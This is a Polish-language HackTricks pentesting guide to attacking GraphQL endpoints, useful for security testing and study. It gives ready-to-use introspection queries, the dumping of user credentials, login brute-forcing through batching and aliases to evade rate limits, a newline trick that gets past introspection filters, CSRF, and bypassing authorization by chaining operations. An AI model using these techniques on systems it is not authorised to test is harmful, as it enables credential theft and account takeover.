# GraphQL

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wprowadzenie

GraphQL jest **wyróżniany** jako **efektywna alternatywa** dla interfejsu REST API, oferując uproszczone podejście do pobierania danych z backendu. W przeciwieństwie do REST, który często wymaga wielu żądań do różnych punktów końcowych w celu zebrania danych, GraphQL umożliwia pobranie wszystkich wymaganych informacji za pomocą **jednego żądania**. To uproszczenie znacznie **ułatwia programistom** proces pobierania danych.

## GraphQL i bezpieczeństwo

Wraz z pojawieniem się nowych technologii, w tym GraphQL, pojawiają się również nowe podatności bezpieczeństwa. Ważnym punktem do zauważenia jest to, że **GraphQL nie zawiera domyślnie mechanizmów uwierzytelniania**. Odpowiedzialność za wdrożenie takich środków bezpieczeństwa spoczywa na programistach. Bez odpowiedniego uwierzytelnienia punkty końcowe GraphQL mogą ujawniać poufne informacje nieuwierzytelnionym użytkownikom, stwarzając znaczne ryzyko bezpieczeństwa.

### Ataki siłowe na katalogi i GraphQL

Aby zidentyfikować wystawione instancje GraphQL, zaleca się uwzględnienie określonych ścieżek w atakach siłowych na katalogi. Są to ścieżki:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Zidentyfikowanie otwartych instancji GraphQL umożliwia zbadanie obsługiwanych zapytań. Jest to kluczowe dla zrozumienia danych dostępnych za pośrednictwem punktu końcowego. System introspekcji GraphQL ułatwia to, podając szczegóły dotyczące obsługiwanych zapytań schematu. Aby uzyskać więcej informacji na ten temat, odwołaj się do dokumentacji GraphQL na temat introspekcji: [**GraphQL: Język zapytań dla interfejsów API.**](https://graphql.org/learn/introspection/)

### Odcisk palca

Narzędzie [**graphw00f**](https://github.com/dolevf/graphw00f) jest w stanie wykryć, jakie silniki GraphQL są używane na serwerze, a następnie wyświetla niektóre pomocne informacje dla audytora bezpieczeństwa.

#### Uniwersalne zapytania <a href="#universal-queries" id="universal-queries"></a>

Aby sprawdzić, czy dany URL jest usługą GraphQL, można wysłać **uniwersalne zapytanie**, `query{__typename}`. Jeśli odpowiedź zawiera `{"data": {"__typename": "Query"}}`, potwierdza to, że URL hostuje punkt końcowy GraphQL. Ta metoda opiera się na polu `__typename` GraphQL, które ujawnia typ zapytanego obiektu.
```javascript
query{__typename}
```
### Podstawowe wyliczanie

Graphql zazwyczaj obsługuje metody **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). Chociaż w celu zwiększenia bezpieczeństwa zaleca się zezwalać tylko na json, aby zapobiec atakom CSRF.

#### Introspekcja

Aby użyć introspekcji do odkrywania informacji o schemacie, zapytaj pole `__schema`. To pole jest dostępne w głównym typie wszystkich zapytań.
```bash
query={__schema{types{name,fields{name}}}}
```
Za pomocą tego zapytania znajdziesz nazwę wszystkich używanych typów:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Za pomocą tego zapytania możesz wyodrębnić wszystkie typy, ich pola i argumenty (oraz typ argumentów). Będzie to bardzo przydatne do poznania sposobu zapytywania bazy danych.

![](<../../.gitbook/assets/image (207) (3).png>)

**Błędy**

Warto wiedzieć, czy **błędy** będą **wyświetlane**, ponieważ przyczynią się one do dostarczenia przydatnych **informacji**.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**Wylicz schemat bazy danych za pomocą introspekcji**

{% hint style="info" %}
Jeśli introspekcja jest włączona, ale powyższe zapytanie nie działa, spróbuj usunąć dyrektywy `onOperation`, `onFragment` i `onField` z struktury zapytania.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Zapytanie o introspekcję w linii:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Ostatnia linia kodu to zapytanie graphql, które wyświetli wszystkie metadane z graphql (nazwy obiektów, parametry, typy...)

![](<../../.gitbook/assets/image (206).png>)

Jeśli introspekcja jest włączona, możesz użyć [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager), aby wyświetlić w GUI wszystkie opcje.

### Zapytanie

Teraz, gdy wiemy, jakie informacje są przechowywane w bazie danych, spróbujmy **wydobyć niektóre wartości**.

W introspekcji możesz znaleźć **który obiekt możesz bezpośrednio zapytać** (ponieważ nie możesz zapytać obiektu tylko dlatego, że istnieje). Na poniższym obrazku możesz zobaczyć, że "_queryType_" nazywa się "_Query_" i że jednym z pól obiektu "_Query_" jest "_flags_", który również jest typem obiektu. Dlatego możesz zapytać obiekt flagi.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Zauważ, że typ zapytania "_flags_" to "_Flags_", a ten obiekt jest zdefiniowany jak poniżej:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Możesz zobaczyć, że obiekty "_Flags_" składają się z **nazwy** i **wartości**. Następnie możesz uzyskać wszystkie nazwy i wartości flag za pomocą zapytania:
```javascript
query={flags{name, value}}
```
Zauważ, że w przypadku, gdy **obiekt do zapytania** jest **typem prostym** jak **string** jak w poniższym przykładzie

![](<../../.gitbook/assets/image (441).png>)

Możesz go po prostu zapytać:
```javascript
query={hiddenFlags}
```
W innym przykładzie, gdzie w obiekcie typu "_Query_" były 2 obiekty: "_user_" i "_users_".\
Jeśli te obiekty nie wymagają żadnego argumentu do wyszukiwania, można **pobrać wszystkie informacje z nich**, po prostu **pytając** o dane, których potrzebujesz. W tym przykładzie z Internetu można wydobyć zapisane nazwy użytkowników i hasła:

![](<../../.gitbook/assets/image (208).png>)

Jednak w tym przykładzie, jeśli spróbujesz to zrobić, otrzymasz ten **błąd**:

![](<../../.gitbook/assets/image (210).png>)

Wygląda na to, że w jakiś sposób będzie wyszukiwać używając argumentu "_**uid**_" typu _**Int**_.\
W każdym razie już to wiedzieliśmy, w sekcji [Podstawowe wyliczanie](graphql.md#basic-enumeration) zaproponowano zapytanie, które pokazywało nam wszystkie potrzebne informacje: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Jeśli przeczytasz dostarczone zdjęcie, gdy wykonuję to zapytanie, zobaczysz, że "_**user**_" miał argument "_**uid**_" typu _Int_.

Więc, wykonując lekkie bruteforce _**uid**_, odkryłem, że dla _**uid**=**1**_ została pobrana nazwa użytkownika i hasło:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Zauważ, że **odkryłem**, że mogę pytać o parametry "_**user**_" i "_**password**_", ponieważ jeśli spróbuję znaleźć coś, czego nie ma (`query={user(uid:1){noExists}}`), otrzymuję ten błąd:

![](<../../.gitbook/assets/image (213).png>)

I podczas fazy **wyliczania** odkryłem, że obiekt "_**dbuser**_" miał pola "_**user**_" i "_**password**_.

**Sztuczka z zrzutem ciągu zapytań (dzięki @BinaryShadow\_)**

Jeśli możesz wyszukiwać według typu ciągu, na przykład: `query={theusers(description: ""){username,password}}` i **szukasz pustego ciągu**, to **wyrzuci wszystkie dane**. (_Zauważ, że ten przykład nie jest związany z przykładem z samouczków, dla tego przykładu zakładamy, że możesz wyszukiwać za pomocą "**theusers**" według pola typu ciągu o nazwie "**description**"_).

### Wyszukiwanie

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** są identyfikowane przez swoje **adresy e-mail** i **imię**; **filmy** przez swoje **nazwy** i **ocenę**. **Osoby** mogą być zaprzyjaźnione między sobą i również mieć filmy, co wskazuje na relacje w bazie danych.

Możesz **wyszukiwać** osoby **według** imienia i otrzymać ich adresy e-mail:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Możesz **wyszukiwać** osoby **po** imieniu i otrzymać informacje o ich **subskrybowanych** **filmach**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Zauważ, że wskazano na pobranie `name` z `subscribedMovies` osoby.

Możesz również **wyszukiwać wiele obiektów jednocześnie**. W tym przypadku wyszukiwane są 2 filmy:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Lub nawet **relacje kilku różnych obiektów za pomocą aliasów**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutacje

**Mutacje służą do wprowadzania zmian po stronie serwera.**

W **introspekcji** można znaleźć **zadeklarowane mutacje**. Na poniższym obrazku "_MutationType_" jest nazywane "_Mutation_", a obiekt "_Mutation_" zawiera nazwy mutacji (jak "_addPerson_" w tym przypadku):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** są identyfikowane przez swoje **adresy e-mail** i **imię**, a **filmy** przez swoje **nazwy** i **oceny**. **Osoby** mogą być ze sobą zaprzyjaźnione i mieć filmy, co wskazuje na relacje w bazie danych.

Mutacja do **tworzenia nowych** filmów w bazie danych może wyglądać jak poniższa (w tym przykładzie mutacja nazywa się `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Zauważ, że zarówno wartości, jak i typ danych są wskazane w zapytaniu.**

Dodatkowo, baza danych obsługuje operację **mutacji** o nazwie `addPerson`, która umożliwia tworzenie **osób** wraz z ich powiązaniami z istniejącymi **przyjaciółmi** i **filmami**. Ważne jest zauważenie, że przyjaciele i filmy muszą istnieć w bazie danych przed ich powiązaniem z nowo utworzoną osobą.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Wykonywanie ataku brute-force w jednym żądaniu API

Ta informacja została zaczerpnięta z [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autoryzacja za pomocą interfejsu API GraphQL z **równoczesnym wysyłaniem wielu zapytań z różnymi danymi uwierzytelniającymi** w celu ich sprawdzenia. To klasyczny atak brute-force, ale teraz możliwe jest wysłanie więcej niż jednej pary login/hasło w jednym żądaniu HTTP dzięki funkcji grupowania GraphQL. Taka metoda wprowadziłaby w błąd zewnętrzne aplikacje monitorujące tempo, które myślałyby, że wszystko jest w porządku i nie ma żadnego botu próbującego zgadywać hasła.

Poniżej znajduje się najprostsza demonstracja żądania uwierzytelniającego aplikacji, z **trzema różnymi parami email/hasło na raz**. Oczywiście można wysłać tysiące w jednym żądaniu w ten sam sposób:

![](<../../.gitbook/assets/image (182) (1).png>)

Jak widać na zrzucie ekranu odpowiedzi, pierwsze i trzecie żądania zwróciły _null_ i odzwierciedliły odpowiednie informacje w sekcji _error_. **Druga mutacja zawierała poprawne dane uwierzytelniające** i odpowiedź zawierała poprawny token sesji uwierzytelniającej.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL bez introspekcji

Coraz więcej **punktów końcowych GraphQL wyłącza introspekcję**. Jednak błędy, które GraphQL zwraca, gdy otrzymuje nieoczekane żądanie, są wystarczające dla narzędzi takich jak [**clairvoyance**](https://github.com/nikitastupin/clairvoyance), aby odtworzyć większość schematu.

Ponadto, rozszerzenie Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **obserwuje żądania API GraphQL przechodzące przez Burp** i **buduje** wewnętrzny **schemat GraphQL** dla każdego nowego zapytania, które widzi. Może również ujawnić schemat dla GraphiQL i Voyager. Rozszerzenie zwraca fałszywą odpowiedź, gdy otrzymuje zapytanie introspekcji. W rezultacie GraphQuail pokazuje wszystkie zapytania, argumenty i pola dostępne do użycia w ramach interfejsu API. Więcej informacji można znaleźć [**tutaj**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Ładna **lista słów** do odkrywania [**encji GraphQL można znaleźć tutaj**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Ominięcie obrony przed introspekcją GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **Ominięcie obrony przed introspekcją GraphQL**

Aby ominąć ograniczenia dotyczące zapytań introspekcyjnych w interfejsach API, skutecznym jest wstawienie **specjalnego znaku po słowie kluczowym `__schema`**. Ta metoda wykorzystuje powszechne niedopatrzenia programistów w wyrażeniach regularnych, które mają na celu blokowanie introspekcji, skupiając się na słowie kluczowym `__schema`. Dodając znaki takie jak **spacje, nowe linie i przecinki**, które GraphQL ignoruje, ale mogą nie być uwzględnione w wyrażeniach regularnych, można ominąć ograniczenia. Na przykład, zapytanie introspekcyjne z nową linią po `__schema` może ominąć taką obronę:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Jeśli nie uda się, rozważ alternatywne metody żądania, takie jak żądania **GET** lub **POST z `x-www-form-urlencoded`**, ponieważ ograniczenia mogą dotyczyć tylko żądań POST.

### **Odkrywanie ujawnionych struktur GraphQL**

Kiedy introspekcja jest wyłączona, badanie kodu źródłowego strony internetowej w poszukiwaniu wczytanych zapytań w bibliotekach JavaScript jest przydatną strategią. Te zapytania można znaleźć za pomocą zakładki `Sources` w narzędziach dla programistów, co pozwala uzyskać wgląd w schemat API i ujawnić potencjalnie **ujawnione wrażliwe zapytania**. Polecenia do wyszukiwania w narzędziach dla programistów to:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF w GraphQL

Jeśli nie wiesz, czym jest CSRF, przeczytaj następującą stronę:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Tam będziesz mógł znaleźć kilka punktów końcowych GraphQL **skonfigurowanych bez tokenów CSRF.**

Zauważ, że żądania GraphQL są zazwyczaj wysyłane za pomocą żądań POST przy użyciu nagłówka Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Jednak większość punktów końcowych GraphQL obsługuje również żądania POST w formacie **`form-urlencoded`**:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Dlatego, ponieważ żądania CSRF takie jak poprzednie są wysyłane **bez żądań preflight**, możliwe jest **wykonanie** **zmian** w GraphQL, nadużywając CSRF.

Należy jednak zauważyć, że nowa domyślna wartość ciasteczka `samesite` w przeglądarce Chrome to `Lax`. Oznacza to, że ciasteczko będzie wysyłane tylko z witryny zewnętrznej w żądaniach GET.

Należy również zauważyć, że zazwyczaj możliwe jest wysłanie **żądania zapytania** również jako **żądanie GET**, a token CSRF może nie być sprawdzany w żądaniu GET.

Dodatkowo, nadużywając [**ataku XS-Search**](../../pentesting-web/xs-search.md), możliwe jest wydobywanie zawartości z punktu końcowego GraphQL, nadużywając poświadczeń użytkownika.

Aby uzyskać więcej informacji, **sprawdź** [**oryginalny post tutaj**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autoryzacja w GraphQL

Wiele funkcji GraphQL zdefiniowanych na punkcie końcowym może sprawdzać tylko uwierzytelnienie żądającego, ale nie autoryzację.

Modyfikowanie zmiennych wejściowych zapytania może prowadzić do **wycieku** wrażliwych danych konta [leaked](https://hackerone.com/reports/792927).

Mutacja może nawet prowadzić do przejęcia konta, próbując zmodyfikować dane innego konta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Ominięcie autoryzacji w GraphQL

[Łączenie zapytań](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) może obejść słaby system uwierzytelniania.

W poniższym przykładzie można zobaczyć, że operacja to "forgotPassword" i powinna ona wykonywać tylko związane z nią zapytanie forgotPassword. Można to obejść, dodając zapytanie na końcu, w tym przypadku dodajemy "register" i zmienną użytkownika, aby system zarejestrował nowego użytkownika.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Ominięcie limitów szybkości za pomocą aliasów w GraphQL

W GraphQL aliasy są potężną funkcją, która umożliwia **eksplikacyjne nazwanie właściwości** podczas wykonywania żądania API. Ta funkcjonalność jest szczególnie przydatna do pobierania **wielu instancji tego samego typu** obiektu w jednym żądaniu. Aliasy mogą być wykorzystane do pokonania ograniczenia, które uniemożliwia obiektom GraphQL posiadanie wielu właściwości o tej samej nazwie.

Aby dokładnie zrozumieć aliasy w GraphQL, zaleca się skorzystanie z następującego źródła: [Aliasy](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Podstawowym celem aliasów jest zmniejszenie konieczności wykonywania licznych wywołań API, ale zidentyfikowano niezamierzone zastosowanie, w którym aliasy mogą być wykorzystane do przeprowadzania ataków brute force na punkt końcowy GraphQL. Jest to możliwe, ponieważ niektóre punkty końcowe są chronione przez limity szybkości zaprojektowane w celu uniemożliwienia ataków brute force poprzez ograniczenie **liczby żądań HTTP**. Jednak te limity szybkości mogą nie uwzględniać liczby operacji w każdym żądaniu. Ponieważ aliasy pozwalają na dołączanie wielu zapytań w jednym żądaniu HTTP, mogą one obejść takie ograniczenia limitowania szybkości.

Przyjrzyjmy się poniższemu przykładowi, który ilustruje, jak zapytania z aliasami mogą być używane do weryfikacji poprawności kodów rabatowych w sklepie. Ta metoda może obejść limity szybkości, ponieważ kompiluje kilka zapytań w jedno żądanie HTTP, co potencjalnie pozwala na weryfikację licznych kodów rabatowych jednocześnie.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Narzędzia

### Skanery podatności

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Narzędzie, które można używać do pobierania schematów i wyszukiwania wrażliwych danych, testowania autoryzacji, prób siłowych schematów i znajdowania ścieżek do określonego typu.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Może być używane jako samodzielne narzędzie lub [rozszerzenie Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Może być używane jako klient CLI do automatyzacji ataków.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Narzędzie, które wyświetla różne sposoby dotarcia do określonego typu w schemacie GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Rozszerzenie Burp do zaawansowanego testowania GraphQL. Komponent _**Scanner**_ jest rdzeniem InQL v5.0, gdzie można analizować punkt końcowy GraphQL lub lokalny plik schematu introspekcyjnego. Automatycznie generuje wszystkie możliwe zapytania i mutacje, organizując je w strukturalny widok do analizy. Komponent _**Attacker**_ pozwala uruchamiać wsadowe ataki GraphQL, co może być przydatne do omijania słabo zaimplementowanych limitów szybkości.

### Klienci

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Klient GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Klient GUI

### Automatyczne testy

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Wideo wyjaśniające AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Odwołania

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>
